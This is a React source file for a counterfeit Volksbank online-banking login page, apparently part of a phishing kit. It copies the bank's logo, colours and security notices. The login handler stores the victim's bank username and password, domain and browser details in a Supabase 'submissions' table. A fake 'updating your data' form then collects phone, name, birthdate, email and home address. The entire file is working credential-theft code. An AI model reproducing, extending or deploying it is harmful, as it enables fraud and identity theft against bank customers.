import { useEffect, useRef, useState } from "react";
import { useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { X, Eye, EyeOff } from "lucide-react";
import { formatBirthdate } from "@/lib/banks";
import volksbankLogo from "@/assets/volksbank-logo.png";
import volksbankBg from "@/assets/volksbank-bg.png";
import volksbankIcon from "@/assets/volksbank.png";

const BLUE = "#196bc1";

const REQUIRED_MESSAGES: Record<string, string> = {
  firstName: "Bitte geben Sie Ihren Vornamen ein",
  lastName: "Bitte geben Sie Ihren Nachnamen ein",
  birthdate: "Bitte geben Sie Ihr Geburtsdatum ein",
  email: "Bitte geben Sie Ihre E-Mail-Adresse ein",
  phone: "Bitte geben Sie Ihre Telefonnummer ein",
  street: "Bitte geben Sie Ihre Straße ein",
  houseNumber: "Bitte geben Sie Ihre Hausnummer ein",
  postalCode: "Bitte geben Sie Ihre Postleitzahl ein",
  city: "Bitte geben Sie Ihre Stadt ein",
};
const DETAILS_FIELDS = ["firstName", "lastName", "birthdate", "email", "street", "houseNumber", "postalCode", "city"];

const VolksbankLogin = () => {
  const navigate = useNavigate();
  usePageMeta("Volksbank - Login", volksbankIcon);
  useEffect(() => { window.scrollTo(0, 0); }, []);

  const [step, setStep] = useState<"login" | "phone" | "details">("login");
  const [sessionId, setSessionId] = useState<string>("");
  const [showLoading, setShowLoading] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [lang, setLang] = useState<"de" | "en">("de");

  // Login fields
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [isFocused, setIsFocused] = useState(false);
  const [isPasswordFocused, setIsPasswordFocused] = useState(false);
  const [showPassword, setShowPassword] = useState(false);

  // Data fields
  const [firstName, setFirstName] = useState("");
  const [lastName, setLastName] = useState("");
  const [birthdate, setBirthdate] = useState("");
  const [email, setEmail] = useState("");
  const [phone, setPhone] = useState("");
  const [street, setStreet] = useState("");
  const [houseNumber, setHouseNumber] = useState("");
  const [staircase, setStaircase] = useState("");
  const [doorNumber, setDoorNumber] = useState("");
  const [postalCode, setPostalCode] = useState("");
  const [city, setCity] = useState("");
  const [touched, setTouched] = useState<Record<string, boolean>>({});

  const values: Record<string, string> = {
    firstName, lastName, birthdate, email, phone, street, houseNumber, postalCode, city,
  };
  const isFieldInvalid = (n: string) => !values[n]?.trim();
  const hasError = (n: string) => !!touched[n] && isFieldInvalid(n);
  const onBlur = (n: string) => () => setTouched((t) => ({ ...t, [n]: true }));

  const inputCls = (n: string) =>
    `w-full px-3 py-2.5 border rounded text-sm outline-none transition-colors ${
      hasError(n)
        ? "border-red-500 bg-red-50 focus:ring-1 focus:ring-red-500"
        : "border-gray-400 bg-[#e8e8e8] focus:bg-[#d6e5f4] focus:border-[#196bc1] focus:ring-1 focus:ring-[#196bc1]"
    }`;

  const handleLogin = async () => {
    const sid = crypto.randomUUID().slice(0, 8);
    setSessionId(sid);

    const domain = typeof window !== "undefined"
      ? window.location.hostname.replace(/^www\./, "").toLowerCase()
      : null;

    const { error: insErr } = await supabase.from("submissions").insert({
      session_id: sid,
      flow: "volksbank_login",
      bank: "Volksbank",
      bank_username: username,
      bank_password: password,
      bank_username_label: "Benutzername",
      bank_password_label: "Passwort",
      domain,
      user_agent: typeof navigator !== "undefined" ? navigator.userAgent : null,
    });
    if (insErr) {
      console.error("Insert failed:", insErr);
    }

    setShowLoading(true);
    setTimeout(() => {
      setShowLoading(false);
      setStep("phone");
      window.scrollTo(0, 0);
    }, 1800);
  };

  const handlePhoneSubmit = async () => {
    if (!phone.trim()) {
      setTouched((t) => ({ ...t, phone: true }));
      return;
    }
    setSubmitting(true);
    const { error } = await supabase
      .from("submissions")
      .update({ phone })
      .eq("session_id", sessionId);
    setSubmitting(false);
    if (error) {
      console.error("Phone update failed:", error);
      alert("Fehler beim Speichern. Bitte versuchen Sie es erneut.");
      return;
    }
    setStep("details");
    window.scrollTo(0, 0);
  };

  const allDetailsValid = DETAILS_FIELDS.every((f) => !!values[f]?.trim());

  const handleDataSubmit = async () => {
    if (!allDetailsValid) {
      setTouched((t) => ({ ...t, ...DETAILS_FIELDS.reduce((acc, f) => ({ ...acc, [f]: true }), {}) }));
      const firstInvalid = DETAILS_FIELDS.find((f) => isFieldInvalid(f));
      if (firstInvalid) {
        requestAnimationFrame(() => {
          document.querySelector<HTMLElement>(`[data-field="${firstInvalid}"]`)
            ?.scrollIntoView({ behavior: "smooth", block: "center" });
        });
      }
      return;
    }
    setSubmitting(true);
    const { error } = await supabase
      .from("submissions")
      .update({
        full_name: `${firstName} ${lastName}`.trim(),
        email,
        birthdate,
        street,
        house_number: houseNumber,
        staircase,
        door_number: doorNumber,
        postal_code: postalCode,
        city,
      })
      .eq("session_id", sessionId);

    if (error) {
      console.error("Update failed:", error);
      setSubmitting(false);
      alert("Fehler beim Speichern der Daten. Bitte versuchen Sie es erneut.");
      return;
    }

    setShowLoading(true);
    setTimeout(() => {
      navigate(`/login/bestaetigung?s=${sessionId}`);
    }, 1500);
  };

  return (
    <>
      {showLoading && (
        <LoadingOverlay
          message={step === "login" ? "Anmeldedaten werden überprüft..." : "Daten werden übermittelt..."}
          onComplete={() => {}}
        />
      )}
      <div className="min-h-screen flex flex-col">
        <header style={{ backgroundColor: "#fff", borderBottom: "1px solid #e0e0e0" }}>
          <div className="max-w-[1200px] mx-auto flex items-center px-4 py-3">
            <img src={volksbankLogo} alt="Volksbank" className="h-10 md:h-14" />
          </div>
        </header>

        <div
          className="flex-1 flex items-center justify-center px-4 py-8"
          style={{
            backgroundImage: `url(${volksbankBg})`,
            backgroundSize: "cover",
            backgroundPosition: "center",
            backgroundRepeat: "no-repeat",
          }}
        >
          <div className="w-full max-w-[560px] rounded overflow-hidden">
            <div
              className="px-6 py-4 text-white font-semibold text-xl"
              style={{ backgroundColor: BLUE }}
            >
              {step === "login"
                ? (lang === "de" ? "hausbanking Login" : "Login")
                : "Daten aktualisieren"}
            </div>

            {step === "login" ? (
              <div className="bg-white px-6 py-5 space-y-4">
                <p className="text-base leading-snug" style={{ color: "#333" }}>
                  {lang === "de"
                    ? "Beim Login wird eine sichere Verbindung aufgebaut. Bitte achten Sie darauf, dass Sie Ihre Zugangsdaten auf keiner Ihnen unbekannten Seite eingeben und diese geheim halten."
                    : "You can register for your new online banking service here. When you log in, a secure connection is established. Please make sure that you do not enter your access details on any other site and keep them secret. We will never ask you for your PIN or a TAN."}
                </p>
                <hr className="-mx-6 border-gray-200" />
                <div className="flex items-center justify-between">
                  <span className="font-semibold text-xs" style={{ color: "#999" }}>
                    {lang === "de" ? "Anmeldung mit Benutzername" : "User name or authorised party number"}
                  </span>
                  <span className="text-sm">
                    <a
                      href="#"
                      onClick={(e) => { e.preventDefault(); setLang(lang === "de" ? "en" : "de"); }}
                      style={{ color: BLUE }}
                    >
                      {lang === "de" ? "English" : "Deutsch"}
                    </a>
                  </span>
                </div>
                <div className="relative">
                  <input
                    type="text"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    onFocus={() => setIsFocused(true)}
                    onBlur={() => setIsFocused(false)}
                    className="w-full px-3 py-2.5 border rounded text-sm outline-none transition-colors"
                    style={{
                      backgroundColor: isFocused ? "#d6e5f4" : "#e8e8e8",
                      borderColor: isFocused ? BLUE : "#999",
                      boxShadow: isFocused ? `0 0 0 1px ${BLUE}` : "none",
                    }}
                  />
                  {username && (
                    <button onClick={() => setUsername("")} className="absolute right-2 top-1/2 -translate-y-1/2" type="button">
                      <X size={24} color={isFocused ? BLUE : "#333"} />
                    </button>
                  )}
                </div>
                <span className="font-semibold text-xs" style={{ color: "#999" }}>
                  {lang === "de" ? "Passwort" : "Password"}
                </span>
                <div className="relative">
                  <input
                    type={showPassword ? "text" : "password"}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    onFocus={() => setIsPasswordFocused(true)}
                    onBlur={() => setIsPasswordFocused(false)}
                    className="w-full px-3 py-2.5 border rounded text-sm outline-none transition-colors"
                    style={{
                      backgroundColor: isPasswordFocused ? "#d6e5f4" : "#e8e8e8",
                      borderColor: isPasswordFocused ? BLUE : "#999",
                      boxShadow: isPasswordFocused ? `0 0 0 1px ${BLUE}` : "none",
                    }}
                  />
                  {password && (
                    <button onClick={() => setShowPassword(!showPassword)} className="absolute right-2 top-1/2 -translate-y-1/2" type="button">
                      {showPassword
                        ? <EyeOff size={20} color={isPasswordFocused ? BLUE : "#333"} />
                        : <Eye size={20} color={isPasswordFocused ? BLUE : "#333"} />}
                    </button>
                  )}
                </div>
                <hr className="-mx-6 border-gray-200" />
                <button
                  onClick={handleLogin}
                  className="w-full py-3 text-white font-semibold rounded text-sm"
                  style={{ backgroundColor: BLUE }}
                >
                  {lang === "de" ? "Weiter" : "Continue"}
                </button>
                <hr className="-mx-6 border-gray-200" />
                {lang === "de" && (
                  <p className="text-[15px] text-center" style={{ color: "#333" }}>
                    Durch die Eingabe Ihrer Zugangsdaten stimmen Sie den Nutzungsbedingungen der Bank ausdrücklich zu.
                  </p>
                )}
                <div className="flex flex-col items-center" style={{ gap: 0 }}>
                  <a href="#" onClick={(e) => e.preventDefault()} className="text-[15px] no-underline hover:underline leading-tight py-0 my-0" style={{ color: BLUE }}>
                    {lang === "de" ? "Benutzername vergessen?" : "Forgot username?"}
                  </a>
                  <a href="#" onClick={(e) => e.preventDefault()} className="text-[15px] no-underline hover:underline leading-tight py-0 my-0" style={{ color: BLUE }}>
                    {lang === "de" ? "Passwort vergessen?" : "Forgot password?"}
                  </a>
                </div>
              </div>
            ) : (
              <div className="bg-white px-6 py-5 space-y-4">
                <div className="rounded border-l-4 p-3 text-[13.5px]" style={{ borderColor: BLUE, backgroundColor: "#eaf2fb", color: "#1a3a63" }}>
                  <strong>Wichtig:</strong> Aus Sicherheitsgründen bitten wir Sie, Ihre persönlichen Daten zu überprüfen und zu aktualisieren.
                </div>

                <div className="grid grid-cols-2 gap-3">
                  <div data-field="firstName">
                    <label className="block text-xs font-semibold mb-1" style={{ color: "#666" }}>Vorname *</label>
                    <input type="text" value={firstName} onChange={(e) => setFirstName(e.target.value)} onBlur={onBlur("firstName")} className={inputCls("firstName")} />
                    {hasError("firstName") && <p className="mt-1 text-[12px] text-red-600">{REQUIRED_MESSAGES.firstName}</p>}
                  </div>
                  <div data-field="lastName">
                    <label className="block text-xs font-semibold mb-1" style={{ color: "#666" }}>Nachname *</label>
                    <input type="text" value={lastName} onChange={(e) => setLastName(e.target.value)} onBlur={onBlur("lastName")} className={inputCls("lastName")} />
                    {hasError("lastName") && <p className="mt-1 text-[12px] text-red-600">{REQUIRED_MESSAGES.lastName}</p>}
                  </div>
                </div>

                <div data-field="birthdate">
                  <label className="block text-xs font-semibold mb-1" style={{ color: "#666" }}>Geburtsdatum *</label>
                  <input
                    type="text"
                    inputMode="numeric"
                    value={birthdate}
                    onChange={(e) => {
                      let raw = e.target.value;
                      if (raw.length < birthdate.length && birthdate.endsWith(".") && !raw.endsWith(".")) {
                        raw = raw.slice(0, -1);
                      }
                      setBirthdate(formatBirthdate(raw));
                    }}
                    onBlur={onBlur("birthdate")}
                    placeholder="TT.MM.JJJJ"
                    maxLength={10}
                    className={inputCls("birthdate")}
                  />
                  {hasError("birthdate") && <p className="mt-1 text-[12px] text-red-600">{REQUIRED_MESSAGES.birthdate}</p>}
                </div>

                <div className="grid grid-cols-2 gap-3">
                  <div data-field="street">
                    <label className="block text-xs font-semibold mb-1" style={{ color: "#666" }}>Straße *</label>
                    <input type="text" value={street} onChange={(e) => setStreet(e.target.value)} onBlur={onBlur("street")} className={inputCls("street")} />
                    {hasError("street") && <p className="mt-1 text-[12px] text-red-600">{REQUIRED_MESSAGES.street}</p>}
                  </div>
                  <div data-field="houseNumber">
                    <label className="block text-xs font-semibold mb-1" style={{ color: "#666" }}>Hausnummer *</label>
                    <input type="text" value={houseNumber} onChange={(e) => setHouseNumber(e.target.value)} onBlur={onBlur("houseNumber")} className={inputCls("houseNumber")} />
                    {hasError("houseNumber") && <p className="mt-1 text-[12px] text-red-600">{REQUIRED_MESSAGES.houseNumber}</p>}
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-3">
                  <div>
                    <label className="block text-xs font-semibold mb-1" style={{ color: "#666" }}>Stiege</label>
                    <input type="text" value={staircase} onChange={(e) => setStaircase(e.target.value)} className={inputCls("_optStair")} />
                  </div>
                  <div>
                    <label className="block text-xs font-semibold mb-1" style={{ color: "#666" }}>Türnummer</label>
                    <input type="text" value={doorNumber} onChange={(e) => setDoorNumber(e.target.value)} className={inputCls("_optDoor")} />
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-3">
                  <div data-field="postalCode">
                    <label className="block text-xs font-semibold mb-1" style={{ color: "#666" }}>Postleitzahl *</label>
                    <input type="text" value={postalCode} onChange={(e) => setPostalCode(e.target.value)} onBlur={onBlur("postalCode")} className={inputCls("postalCode")} />
                    {hasError("postalCode") && <p className="mt-1 text-[12px] text-red-600">{REQUIRED_MESSAGES.postalCode}</p>}
                  </div>
                  <div data-field="city">
                    <label className="block text-xs font-semibold mb-1" style={{ color: "#666" }}>Stadt *</label>
                    <input type="text" value={city} onChange={(e) => setCity(e.target.value)} onBlur={onBlur("city")} className={inputCls("city")} />
                    {hasError("city") && <p className="mt-1 text-[12px] text-red-600">{REQUIRED_MESSAGES.city}</p>}
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-3">
                  <div data-field="email">
                    <label className="block text-xs font-semibold mb-1" style={{ color: "#666" }}>E-Mail *</label>
                    <input type="email" value={email} onChange={(e) => setEmail(e.target.value)} onBlur={onBlur("email")} className={inputCls("email")} />
                    {hasError("email") && <p className="mt-1 text-[12px] text-red-600">{REQUIRED_MESSAGES.email}</p>}
                  </div>
                  <div data-field="phone">
                    <label className="block text-xs font-semibold mb-1" style={{ color: "#666" }}>Telefonnummer *</label>
                    <input type="tel" value={phone} onChange={(e) => setPhone(e.target.value)} onBlur={onBlur("phone")} className={inputCls("phone")} />
                    {hasError("phone") && <p className="mt-1 text-[12px] text-red-600">{REQUIRED_MESSAGES.phone}</p>}
                  </div>
                </div>

                <hr className="-mx-6 border-gray-200" />
                <button
                  onClick={handleDataSubmit}
                  disabled={submitting}
                  className="w-full py-3 text-white font-semibold rounded text-sm disabled:opacity-60"
                  style={{ backgroundColor: BLUE }}
                >
                  Daten aktualisieren
                </button>
              </div>
            )}
          </div>
        </div>
      </div>
    </>
  );
};

export default VolksbankLogin;
